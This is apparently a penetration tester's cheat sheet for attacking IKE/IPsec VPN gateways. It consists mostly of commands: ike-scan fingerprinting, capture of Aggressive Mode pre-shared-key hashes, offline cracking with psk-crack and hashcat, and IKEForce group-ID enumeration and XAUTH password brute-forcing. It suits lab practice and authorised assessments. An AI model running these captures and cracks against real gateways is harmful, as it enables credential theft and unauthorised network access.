!!! tip "Start here"
    Probe Aggressive Mode for PSK capture: `ike-scan -A $IP` — if it responds, capture the PSK hash with `ike-scan -A -P ike_psk_params.txt $IP` and crack offline with `psk-crack -d wordlist.txt ike_psk_params.txt` or hashcat mode 5300/5400. Aggressive Mode + PSK is the most common IKEv1 weakness.

References: [Expressway](Expressway.md#Foothold%20—%20IKE%20PSK%20recovery)

---
## Key Concepts (quick reference)

- **Ports:** 500/udp (IKE/ISAKMP), **4500/udp** (NAT-T after NAT detected). ([IETF Datatracker](https://datatracker.ietf.org/doc/html/rfc3947?utm_source=chatgpt.com "RFC 3947 - Negotiation of NAT-Traversal in the IKE"))
    
- **IKEv1 modes:** Main (safer), Aggressive (**can leak data needed for offline PSK cracking**). IKEv2 simplifies and is generally preferred. ([IETF Datatracker](https://datatracker.ietf.org/doc/html/rfc7296?utm_source=chatgpt.com "RFC 7296 - Internet Key Exchange Protocol Version 2 ..."))
    
- **Common auth:** PSK, certificates, or EAP (often with XAUTH in legacy setups).
    
- **Transform set:** Encryption, hash, auth, DH group — often fingerprintable from responders.
    

---
## What to Run First

1. **Discovery & basic fingerprinting**

```bash
sudo nmap -sU -p 500,4500 -sV --script ike-version $IP
```

Identifies IKE service, vendor IDs, and capabilities. ([Nmap](https://nmap.org/nsedoc/scripts/ike-version.html?utm_source=chatgpt.com "ike-version NSE script"))

2. **Deeper enumeration (ike-scan)**
    
```bash
ike-scan $IP                # Is IKE responding?
ike-scan -M $IP             # Main Mode transform hints/fingerprint
ike-scan -A $IP             # Aggressive Mode probe (if enabled)
sudo ike-scan -A -P $IP     # Crack aggressive mode pre-shared keys
```

Use Aggressive Mode only to validate exposure to PSK hash capture. ([Kali Linux](https://www.kali.org/tools/ike-scan/?utm_source=chatgpt.com "ike-scan | Kali Linux Tools"))

---
## Enumeration

### Nmap (safe fingerprinting)

```bash
sudo nmap -sU -p 500 --script ike-version $IP
```

- Returns vendor IDs, features (e.g., DPD, XAUTH). Add `-p 4500` if NAT-T likely. ([Nmap](https://nmap.org/nsedoc/scripts/ike-version.html?utm_source=chatgpt.com "ike-version NSE script"))
    

### ike-scan (active IKEv1 probing)

```bash
# Main Mode transforms & backoff fingerprint (less intrusive)
ike-scan -M $IP

# Aggressive Mode test (reveals more; risk = enables PSK capture)
ike-scan -A $IP

# Try with a candidate group name / ID (Aggressive Mode only)
ike-scan -A --id=<GROUP_ID> $IP
```

Notes: Aggressive Mode responses can include vendor IDs and permit PSK parameter capture. ([Debian Manpages](https://manpages.debian.org/testing/ike-scan/ike-scan.1.en.html?utm_source=chatgpt.com "ike-scan — Debian testing"))

### Group/ID & XAUTH enumeration (legacy stacks)

```bash
# IKEForce for group/ID enumeration and XAUTH workflows
python3 ikeforce.py $IP -e -w groupnames.txt             # enumerate group IDs
python3 ikeforce.py $IP -b -i <GROUP_ID> -k <PSK> \
  -U users.txt -w passwords.txt                           # XAUTH brute
```

Helpful where devices leak differences on valid vs invalid IDs or support XAUTH. ([Trustwave](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part3/?utm_source=chatgpt.com "Cracking IKE Mission:Improbable (Part3)"))

---
## Attack Paths & Proofs

### IKEv1 Aggressive Mode PSK – **offline crack**

1. **Capture PSK parameters** (HASH_R, etc.):
    

```bash
ike-scan -A --id=<GROUP_ID> -P ike_psk_params.txt $IP
```

2. **Crack with psk-crack**:
    

```bash
psk-crack -d wordlist.txt ike_psk_params.txt
```

3. **Or crack with hashcat** (depends on hash family negotiated):
    

```bash
# MD5-based IKE PSK
hashcat -m 5300 ike_psk_params.txt wordlist.txt
# SHA1-based IKE PSK
hashcat -m 5400 ike_psk_params.txt wordlist.txt
```

This workflow relies on the well-known weakness of **Aggressive Mode with PSK** allowing offline guessing. ([Kali Linux](https://www.kali.org/tools/ike-scan/?utm_source=chatgpt.com "ike-scan | Kali Linux Tools"))

### Group/ID discovery → PSK capture

If the gateway requires a correct **group name/ID** to return PSK parameters, enumerate IDs (e.g., with IKEForce) and then rerun `ike-scan -A --id=<GROUP_ID> -P ...`. ([Trustwave](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part3/?utm_source=chatgpt.com "Cracking IKE Mission:Improbable (Part3)"))

---
## Recognition Cues (what “good/bad” looks like)

- **Aggressive Mode response** shows `SA=(Enc=..., Hash=..., Group=..., Auth=...)` and may include **VIDs** (e.g., Cisco Unity, XAUTH). Presence of Aggressive Mode plus PSK implies **offline crack risk**. ([NCC Group](https://www.nccgroup.com/research-blog/cisco-ipsec-vpn-implementation-group-name-enumeration/?utm_source=chatgpt.com "Cisco IPSec VPN Implementation Group Name Enumeration"))
    
- **NAT-T behavior:** Initial IKE on 500 then switch/also listen on **4500/udp** when NAT detected. Scan both. ([IETF Datatracker](https://datatracker.ietf.org/doc/html/rfc3947?utm_source=chatgpt.com "RFC 3947 - Negotiation of NAT-Traversal in the IKE"))
    

---
## Evidence Collection

```bash
# Save interactive attempts & timing
script -qc 'ike-scan -M $IP; ike-scan -A --id=<GROUP_ID> -P ike_psk_params.txt $IP' ike-enum.log

# PCAP for report
sudo tcpdump -nn -i <iface> udp port 500 or udp port 4500 -w ike_handshake.pcap
```

Keep:

- `ike_psk_params.txt` (inputs for cracking).
    
- `ike-enum.log` (commands + outputs).
    
- `ike_handshake.pcap` (handshake proof).
    

---
## Bookmarks (tools & references)

- Nmap `ike-version` NSE script. ([Nmap](https://nmap.org/nsedoc/scripts/ike-version.html?utm_source=chatgpt.com "ike-version NSE script"))
    
- `ike-scan` & `psk-crack` usage/manpage. ([Kali Linux](https://www.kali.org/tools/ike-scan/?utm_source=chatgpt.com "ike-scan | Kali Linux Tools"))
    
- Hashcat example hashes (modes **5300** IKE-PSK MD5, **5400** IKE-PSK SHA1). ([hashcat.net](https://hashcat.net/wiki/doku.php?id=example_hashes&utm_source=chatgpt.com "example_hashes [hashcat wiki]"))
    
- NAT-T (UDP 4500) overview (RFC 3947). ([IETF Datatracker](https://datatracker.ietf.org/doc/html/rfc3947?utm_source=chatgpt.com "RFC 3947 - Negotiation of NAT-Traversal in the IKE"))
    
- IKEv2 spec (RFC 7296). ([IETF Datatracker](https://datatracker.ietf.org/doc/html/rfc7296?utm_source=chatgpt.com "RFC 7296 - Internet Key Exchange Protocol Version 2 ..."))
    
- Aggressive Mode PSK risk write-ups (Tenable / Trustwave / Raxis). ([Tenable®](https://www.tenable.com/plugins/nessus/62694?utm_source=chatgpt.com "Internet Key Exchange (IKE) Aggressive Mode with Pre ..."))
    